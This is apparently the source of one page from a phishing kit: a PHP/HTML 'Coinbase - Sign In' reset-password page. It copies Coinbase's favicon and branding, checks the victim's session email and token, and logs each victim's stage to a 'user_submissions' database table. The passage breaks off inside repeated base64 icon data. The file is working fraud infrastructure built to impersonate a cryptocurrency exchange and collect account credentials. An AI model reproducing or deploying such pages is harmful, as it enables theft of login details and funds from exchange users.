<?php
// Start the session
session_start();

// Include the database connection file
require_once "admin/db_connection.php";

$token = $_SESSION["token"];

// Function to update user activity
function updateActivity($token, $activity) {
  global $conn; // Access the database connection within the function
  $sql = "UPDATE user_submissions SET activity = ? WHERE token = ?";
  $stmt = $conn->prepare($sql);
  $stmt->bind_param("ss", $activity, $token);
  $stmt->execute();
  $stmt->close();
}

// Check if the email and token are set in the session
if (!isset($_SESSION["email"]) || !isset($_SESSION["token"])) {
  // If email or token is not set, redirect the user back to login.php
  header("Location: login.php");
  exit();
}


// Update user activity to indicate PasswordPage
updateActivity($token, "ResetPasswordPage");
?>

<html lang="en" class="js-focus-visible" data-js-focus-visible=""><head>
<link rel="icon" data-savepage-href="https://login.coinbase.com/static/6028d3ddca338885c7ab.png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOQAAADkCAMAAAC/iXi/AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFfUExURQAAAP////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////7///7+/+/0/+7z/9/p/97p/97o/93o/8/f/87f/8/e/87e/87d/83d/7/U/7/T/77T/77S/7DJ/6/J/6/I/67I/6C//6C+/5++/56+/5+9/5C1/5G0/5Cz/4+z/46z/4+y/4Cq/4Gp/4Cp/4Go/3+p/4Co/3+o/3+n/3Gf/3Cf/3Ge/3Ce/2+e/3Cd/2+c/2GU/2GT/2CT/2GS/1+T/2CS/16S/1GJ/1GI/1CI/0+I/0F+/0F9/0B9/zF0/zFz/zBz/zFy/zBy/yJp/yFp/yFo/yBo/xJe/xFe/xFd/xBd/xFc/xBc/wFT/wFS/wBS/03lf0EAAAAkdFJOUwAQIDBATk9QXl9gbm9wf4COj5Cen6Cur76/zc7P3d7f7e7v/jYqYzkAAAqXSURBVHja3JrNattAFIUjyVTYuLbjKDgiRkPkAaFFycJaeBFttCpokzrQUC9MEQ2lGVovfN+fQigMhfpWM6P5kb83+LhnztwRujCAH4zG02gRE0LoHwhZxotoOg4H3kXf8UfTaJlSlHS5mIZBX/3mXK8F8bxnpv44SqkEZDH0eyHoDeaEKkCi0HXDUZxSdRZDz1nDEDEU93RRcTBHDOVyGzg2xHFMNZA4FFtvklJNkMh3I6cx1Urkn7EiJx6csSLnxt40A0TxTELrXVLOmWryRjUFmZg+jIRaIHlnMqnXlHOmmR2l1BrJ0MwYeaee7TDDlFomGbp6b2R5UZZ1vd29sa3rclN8oJLMPJ2OPqHC5GW9eznAPzk0+3oj4ZpojOw4FfXbcj2EZrvJqRB373U5CkU1K3cMBGDPYqIzPVFdCoywbkCCphLwvNUQ2YBoNOS8tPdMfFs3R1Y1oEjzkLU8mGHHlUNbsd4eoAPYc7txrjpd2SftFBvojKYwbXlpTpHDHoxaRgKKxjWvNDiaUOS8FgKWeh3zBrTRooKuDDhmNWilzlQt1R3XDBDMHM0rvXdHtgeOvczOdDpuDsCxOMzVRJtj9gTG+JThltJPr5Ci3DMwyGuOW4Zyjn5KMSowy7HCt/VAypGYjyrOY/cvryVFyF/AAt/QyN7KLOX2jyN+MNUvkrGtmwPnV4FWbIelU4E9jg9Y+QgdSw8rnY9glRorH0/5QHJH+5bqx3LkqCO3VN8JfII6Om151zaw16ij45Y3omHFe9XNjl0NFcO6AVc4FkhglcKaH8AZfuYq3wnC044MENzZ8FaD/0qeDisDp/hKT5HIfwx4AhSXXl5T2dapwDWOFdI9Uq2TA8f98pmhg6QnyBg4yI/sVPcEMoP8Apw+HMsbiUGW4CbHQvwaidEbsi+BxUc5QMLqKo+io4yxsPYmsPgofbRZexNYfJTXyBvSYWqRUfoG1gDGmje+M/0rwcpDBqmnddiu+vvfuft1ve9G9TOywbb8CrkGZQ4n/5nLy33H3YNvsCNdD6ymzPC/KRtNj67V7/bO+LuJIojjm0tsJbTNC6FtoHB43bkcZ8RaAjbWRpAqxgatfYilCLUGUNMzxt7d//+s+MOoLze9u8zdbks//0De9813Zya7e7OzxP9IzvIx2nLgRN7fYwslnXqKRCA5JNK4W14WoSzFSzsdVol0NPlDWSXcyhPIvguJaHoMoSRTT5k7tY7akJgvjphDKafEv1mEsfQZwphLMF/ESD0F5mbnEaTD3gnT4TuEX2m37uVkVcTeYu1gZflEtzrp1oi3AhOwnu5Hhyf7lbN+eC5MxOpR2tRD+3WaJe2gRhUqD4h+gOgE3Jw1okrG1FPFToBtz3zkAgOf8e2nm3TfCr+GyWkDB/YWn18NsoC4mdZHGnuPya/4f2uRy637wMVNj8uvNXJJ9hUkHeQul18tXJIsbt0AguwbvKFDLMpppk5gFxAVhg3uEJ3dJaa+1QVW7jIdGVSJ0wFPTWZFGn2eRbkU3bi6qrIOsspTRKzovLOmLutgseRZlAbmnQnvengOsHN30kqJmafCUiV3gZ9Gn2UTpBLZ76RIrepDOYjsea7BGFZyauhoGkeTZR5Mr8sceWcDMqHLkXmsqI26XpgMB0ADvwYbEem1BOP4SaVbkYbH0PPIYkQF6WvhVrAfM6RXWRazMI4jpbkVcTuJaEf8b64wVBAPtKYi5hkqyD5oTU0sMpxmPQCtWRRXGMrkHdCaurjGsC1wC7TGFDcYegF4C0R62otk+Df5GvRGjhe5Gyahfy7yXOS5yHOR5yL/L3J58hLi6S6Spxk4b+t0Fdlh3BhQz5K4wiCyDVpTfzv+NM8zHNw9A62pjd/Ics7WRtbZ2pJsRWxJlonbWMoXpb3Hsbk8JYoMfV3Y1/qYoCQMjgOfkQOZsMpy1FyIOLrraHF0Zz9mOroT1zguf/SVu5U+hJ0n0qviA8pPWI7TF4UQFZbLrj29L0aUiU1JtamnGSYj+DryMx8DiMyjMpSNH3kuKxXFMctE5lEZyibT3WVi/KenKpQYSJ4LhHXiKuhu4lA2gZX1MCnfEldBy8SiVFcrG1yXeqeIAQNOmJh14MN+FCZlSI7mWSZuuagy7AdhYp6TX7/Mc03D6Cv9ZGIjqt95wyzbxy+93DMr4rswBvkuPfWjH6palo1H/J8xiRtcfg1HH3IknXt8MzRxUN8lxk8LGZLP7TDkcivUTpob1Vej8vYoDLlyq3wHP05fJj5Jy1mlnU6jvzZe5InTsZyj/FU27hEaCQZRm+dImXVG5mg9vcYvw1QEXwFRQNCvnFMxenbKHuD7MB2+G2OE1BXmsRj7aSxrN1+HKXkS7VakxD3gxOvYya06ChkDiW5FvzKFEtltJpO42mcYVUOP7L3EFkqkF1+mjasxBf6deCOmS8AYSvTsTTuexG9GWYyPKsYcJNma9CXJpn2yUVEiYyDRrcgsbyiRfTKcjZubLCPd6LSDqYc/lKiz2Rgj1G40N/sYRJ7USj8eUoHx/Bxy4O1vfvxRo4E01zefjUIOniSYbF/IY2Dm6/4bPC9EMgqkNJLMsO2GOhN06UDGrCLOYagxAyACmSCUrVBf/BYxwzZJKOGFvmZ9QgyWThZK509tzeoSgUwYyrauZl2LvSKROkSwo6dZt9O8/mLAqcqwvwERyBRPo60Ep+gpDUkEkuhgATb1W5D30763WYHTsiyDbvq3fk2IwPkl1IqX6R4qossIuIc6V0hETk3ykPiKRj3B7y7QWYemYEEU7UCbpLMy4Su/ZQDdU6z/KSDEpgdBXfenGf0u0GadzLDQ1VQjmpXj0fSulhrRrEwP3+qssSriUzAplYGuGuF6QSTAsCCazUCjvEo/Rk0zCwTtP0JFDFsQjZxhfSDePVTWy3EsSGSJVDkI8yd46QLBVZEcwwSK74Lcl+M2EBAVkqJoAcWmn/NyvA/AlnSQaQnaWDYYrABC/79iSLGIsxvkZ1WH1jgnUlMBms5hTlZdA3aNSBVo3DyC6T93GDTS+wQ0nUHmq7EFNPKyEBmrdLp+pmF86HBppFWq86x/4AKDRg6V0BoE2UhsAb9GWiW9NAMFEgmNzJUEZeYpEZvyXFVC68Bnl8hbO2gqEhAqBQ0ZwhkMt28BQv6BZGXaglg4nQM/mDCInzsQC2tKMGOYEBP3wSs/SK3woQsxMYuCHWMJIL7OFPEMkigEedUQWVCVieav7A78IL7AwQ8b6NJs0yrNrAWJcNs7xxENaHmBP3y1veFCIqwZgShbmMhKu/fiYOgHx/xXXOAfy3vaQ32xkdcNkSEFyrK01la70+vtPH3DTq/X6bRcB1IhqwWRLWUTFPPelMgc47IEhcg6hvGsBtPCY6uzGkxZK4j8mDZVSDRLIl8qucu05gSiu2cV1Q39Zcq6IVRh1GU+EktCJaW6VCxRf9PqLxFlmjIjhdZcQehCoZyFTFm/WBBaUWQOp7SqJaEh5QUpuRTWSwWhKQXUOZHCCwWhN9OXzfRCpTSrGEOtMcoLKYRKadUuGuI0UZyu1qWUsfUtVS8QAvVWWllYsuQxUeL+llebQ32nlkJpeqZSW6gvmab8B8s0zfpCrTJTLuYh7y/iksEpnOgjXgAAAABJRU5ErkJggg==">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <link rel="stylesheet" href="resetcss.css" />
    <title>Coinbase - Sign In</title>
    
      <link rel="icon" type="image/png" sizes="228x228" data-savepage-href="https://login.coinbase.com/static/6028d3ddca338885c7ab.png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOQAAADkCAMAAAC/iXi/AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFfUExURQAAAP////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////7///7+/+/0/+7z/9/p/97p/97o/93o/8/f/87f/8/e/87e/87d/83d/7/U/7/T/77T/77S/7DJ/6/J/6/I/67I/6C//6C+/5++/56+/5+9/5C1/5G0/5Cz/4+z/46z/4+y/4Cq/4Gp/4Cp/4Go/3+p/4Co/3+o/3+n/3Gf/3Cf/3Ge/3Ce/2+e/3Cd/2+c/2GU/2GT/2CT/2GS/1+T/2CS/16S/1GJ/1GI/1CI/0+I/0F+/0F9/0B9/zF0/zFz/zBz/zFy/zBy/yJp/yFp/yFo/yBo/xJe/xFe/xFd/xBd/xFc/xBc/wFT/wFS/wBS/03lf0EAAAAkdFJOUwAQIDBATk9QXl9gbm9wf4COj5Cen6Cur76/zc7P3d7f7e7v/jYqYzkAAAqXSURBVHja3JrNattAFIUjyVTYuLbjKDgiRkPkAaFFycJaeBFttCpokzrQUC9MEQ2lGVovfN+fQigMhfpWM6P5kb83+LhnztwRujCAH4zG02gRE0LoHwhZxotoOg4H3kXf8UfTaJlSlHS5mIZBX/3mXK8F8bxnpv44SqkEZDH0eyHoDeaEKkCi0HXDUZxSdRZDz1nDEDEU93RRcTBHDOVyGzg2xHFMNZA4FFtvklJNkMh3I6cx1Urkn7EiJx6csSLnxt40A0TxTELrXVLOmWryRjUFmZg+jIRaIHlnMqnXlHOmmR2l1BrJ0MwYeaee7TDDlFomGbp6b2R5UZZ1vd29sa3rclN8oJLMPJ2OPqHC5GW9eznAPzk0+3oj4ZpojOw4FfXbcj2EZrvJqRB373U5CkU1K3cMBGDPYqIzPVFdCoywbkCCphLwvNUQ2YBoNOS8tPdMfFs3R1Y1oEjzkLU8mGHHlUNbsd4eoAPYc7txrjpd2SftFBvojKYwbXlpTpHDHoxaRgKKxjWvNDiaUOS8FgKWeh3zBrTRooKuDDhmNWilzlQt1R3X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">
      <link rel="icon" type="image/png" sizes="192x192" data-savepage-href="https://login.coinbase.com/static/6028d3ddca338885c7ab.png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOQAAADkCAMAAAC/iXi/AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFfUExURQAAAP////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////7///7+/+/0/+7z/9/p/97p/97o/93o/8/f/87f/8/e/87e/87d/83d/7/U/7/T/77T/77S/7DJ/6/J/6/I/67I/6C//6C+/5++/56+/5+9/5C1/5G0/5Cz/4+z/46z/4+y/4Cq/4Gp/4Cp/4Go/3+p/4Co/3+o/3+n/3Gf/3Cf/3Ge/3Ce/2+e/3Cd/2+c/2GU/2GT/2CT/2GS/1+T/2CS/16S/1GJ/1GI/1CI/0+I/0F+/0F9/0B9/zF0/zFz/zBz/zFy/zBy/yJp/yFp/yFo/yBo/xJe/xFe/xFd/xBd/xFc/xBc/wFT/wFS/wBS/03lf0EAAAAkdFJOUwAQIDBATk9QXl9gbm9wf4COj5Cen6Cur76/zc7P3d7f7e7v/jYqYzkAAAqXSURBVHja3JrNattAFIUjyVTYuLbjKDgiRkPkAaFFycJaeBFttCpokzrQUC9MEQ2lGVovfN+fQigMhfpWM6P5kb83+LhnztwRujCAH4zG02gRE0LoHwhZxotoOg4H3kXf8UfTaJlSlHS5mIZBX/3mXK8F8bxnpv44SqkEZDH0eyHoDeaEKkCi0HXDUZxSdRZDz1nDEDEU93RRcTBHDOVyGzg2xHFMNZA4FFtvklJNkMh3I6cx1Urkn7EiJx6csSLnxt40A0TxTELrXVLOmWryRjUFmZg+jIRaIHlnMqnXlHOmmR2l1BrJ0MwYeaee7TDDlFomGbp6b2R5UZZ1vd29sa3rclN8oJLMPJ2OPqHC5GW9eznAPzk0+3oj4ZpojOw4FfXbcj2EZrvJqRB373U5CkU1K3cMBGDPYqIzPVFdCoywbkCCphLwvNUQ2YBoNOS8tPdMfFs3R1Y1oEjzkLU8mGHHlUNbsd4eoAPYc7txrjpd2SftFBvojKYwbXlpTpHDHoxaRgKKxjWvNDiaUOS8FgKWeh3zBrTRooKuDDhmNWilzlQt1R3X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">
      <link rel="icon" type="image/png" sizes="128x128" data-savepage-href="https://login.coinbase.com/static/6028d3ddca338885c7ab.png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOQAAADkCAMAAAC/iXi/AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAFfUExURQAAAP////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////7///7+/+/0/+7z/9/p/97p/97o/93o/8/f/87f/8/e/87e/87d/83d/7/U/7/T/77T/77S/7DJ/6/J/6/I/67I/6C//6C+/5++/56+/5+9/5C1/5G0/5Cz/4+z/46z/4+y/4Cq/4Gp/4Cp/4Go/3+p/4Co/3+o/3+n/3Gf/3Cf/3Ge/3Ce/2+e/3Cd/2+c/2GU/2GT/2CT/2GS/1+T/2CS/16S/1GJ/1GI/1CI/0+I/0F+/0F9/0B9/zF0/zFz/zBz/zFy/zBy/yJp/yFp/yFo/yBo/xJe/xFe/xFd/xBd/xFc/xBc/wFT/wFS/wBS/03lf0EAAAAkdFJOUwAQIDBATk9QXl9gbm9wf4COj5Cen6Cur76/zc7P3d7f7e7v/jYqYzkAAAqXSURBVHja3JrNattAFIUjyVTYuLbjKDgiRkPkAaFFycJaeBFttCpokzrQUC9MEQ2lGVovfN+fQigMhfpWM6P5kb83+LhnztwRujCAH4zG02gRE0LoHwhZxotoOg4H3kXf8UfTaJlSlHS5mIZBX/3mXK8F8bxnpv44SqkEZDH0eyHoDeaEKkCi0HXDUZxSdRZDz1nDEDEU93RRcTBHDOVyGzg2xHFMNZA4FFtvklJNkMh3I6cx1Urkn7EiJx6csSLnxt40A0TxTELrXVLOmWryRjUFmZg+jIRaIHlnMqnXlHOmmR2l1BrJ0MwYeaee7TDDlFomGbp6b2R5UZZ1vd29sa3rclN8oJLMPJ2OPqHC5GW9eznAPzk0+3oj4ZpojOw4FfXbcj2EZrvJqRB373U5CkU1K3cMBGDPYqIzPVFdCoywbkCCphLwvNUQ2YBoNOS8tPdMfFs3R1Y1oEjzkLU8mGHHlUNbsd4eoAPYc7txrjpd2SftFBvojKYwbXlpTpHDHoxaRgKKxjWvNDiaUOS8FgKWeh3zBrTRooKuDDhmNWilzlQt1R3XDBDMHM0rvXdHtgeOvczOdDpuDsCxOMzVRJtj9gTG+JThltJPr5Ci3DMwyGuOW4Zyjn5KMSowy7HCt/VAypGYjyrOY/cvryVFyF/AAt/QyN7KLOX2jyN+MNUvkrGtmwPnV4FWbIelU4E9jg9Y+QgdSw8rnY9glRorH0/5QHJH+5bqx3LkqCO3VN8JfII6Om151zaw16ij45Y3omHFe9XNjl0NFcO6AVc4FkhglcKaH8AZfuYq3wnC044MENzZ8FaD/0qeDisDp/hKT5HIfwx4AhSXXl5T2dapwDWOFdI9Uq2TA8f98pmhg6QnyBg4yI/sVPcEMoP8Apw+HMsbiUGW4CbHQvwaidEbsi+BxUc5QMLqKo+io4yxsPYmsPgofbRZexNYfJTXyBvSYWqRUfoG1gDGmje+M/0rwcpDBqmnddiu+vvfuft1ve9G9TOywbb8CrkGZQ4n/5nLy33H3YNvsCNdD6ymzPC/KRtNj67V7/bO+LuJIojjm0tsJbTNC6FtoHB43bkcZ8RaAjbWRpAqxgatfYilCLUGUNMzxt7d//+s+MOoLze9u8zdbks//0De9813Zya7e7OzxP9IzvIx2nLgRN7fYwslnXqKRCA5JNK4W14WoSzFSzsdVol0NPlDWSXcyhPIvguJaHoMoSRTT5k7tY7akJgvjphDKafEv1mEsfQZwphLMF/ESD0F5mbnEaTD3gnT4TuEX2m37uVkVcTeYu1gZflEtzrp1oi3AhOwnu5Hhyf7lbN+eC5MxOpR2tRD+3WaJe2gRhUqD4h+gOgE3Jw1okrG1FPFToBtz3zkAgOf8e2nm3TfCr+GyWkDB/YWn18NsoC4mdZHGnuPya/4f2uRy637wMVNj8uvNXJJ9hUkHeQul18tXJIsbt0AguwbvKFDLMpppk5gFxAVhg3uEJ3dJaa+1QVW7jIdGVSJ0wFPTWZFGn2eRbkU3bi6qrIOsspTRKzovLOmLutgseRZlAbmnQnvengOsHN30kqJmafCUiV3gZ9Gn2UTpBLZ76RIrepDOYjsea7BGFZyauhoGkeTZR5Mr8sceWcDMqHLkXmsqI26XpgMB0ADvwYbEem1BOP4SaVbkYbH0PPIYkQF6WvhVrAfM6RXWRazMI4jpbkVcTuJaEf8b64wVBAPtKYi5hkqyD5oTU0sMpxmPQCtWRRXGMrkHdCaurjGsC1wC7TGFDcYegF4C0R62otk+Df5GvRGjhe5Gyahfy7yXOS5yHOR5yL/L3J58hLi6S6Spxk4b+t0Fdlh3BhQz5K4wiCyDVpTfzv+NM8zHNw9A62pjd/Ics7WRtbZ2pJsRWxJlonbWMo